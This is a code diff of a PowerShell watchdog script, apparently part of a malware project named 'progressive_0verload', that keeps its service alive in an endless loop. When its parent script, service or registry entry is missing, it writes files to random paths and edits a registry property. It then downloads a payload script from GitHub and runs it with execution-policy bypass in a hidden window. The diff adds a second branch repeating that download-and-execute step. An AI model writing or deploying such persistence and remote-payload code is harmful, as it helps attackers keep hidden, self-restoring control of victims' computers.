@@ -136,14 +136,21 @@ while ($true) {
     }
     $canUpdateRootPath=$true
 
-    $pRegS = Check-Service -path $parentRegPath
+    $pRegS = Check-ServiceReg -path $parentRegPath
     $pServ = Check-Service -name $parentServiceName
-    if(-not(Test-Path -Path $parentPath -PathType Leaf) -or $pRegS -or $pServ){
+    if(-not(Test-Path -Path $parentPath -PathType Leaf)){
         $initParentServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
         $initParentServicePath = "$initParentServicePath\init_service_rootmonmon.ps1"
         $parentPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
         $parentPath = "$parentPath\root_mon_mon.ps1"
         Set-ItemProperty -Path "$basePath" -Name $parentServicePropertyName -Value $parentPath -Force | Out-Null
+        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1" -OutFile $initParentServicePath
+        powershell.exe -ep bypass -noP -w hidden $initParentServicePath -rootPath $rootPath -basePath "$b"
+    }
+
+    elseif($pRegS -or $pServ){
+        $initParentServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
+        $initParentServicePath = "$initParentServicePath\init_service_rootmonmon.ps1"
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1" -OutFile $initParentServicePath
         powershell.exe -ep bypass -noP -w hidden $initParentServicePath -rootPath $rootPath -basePath "$b"
     }
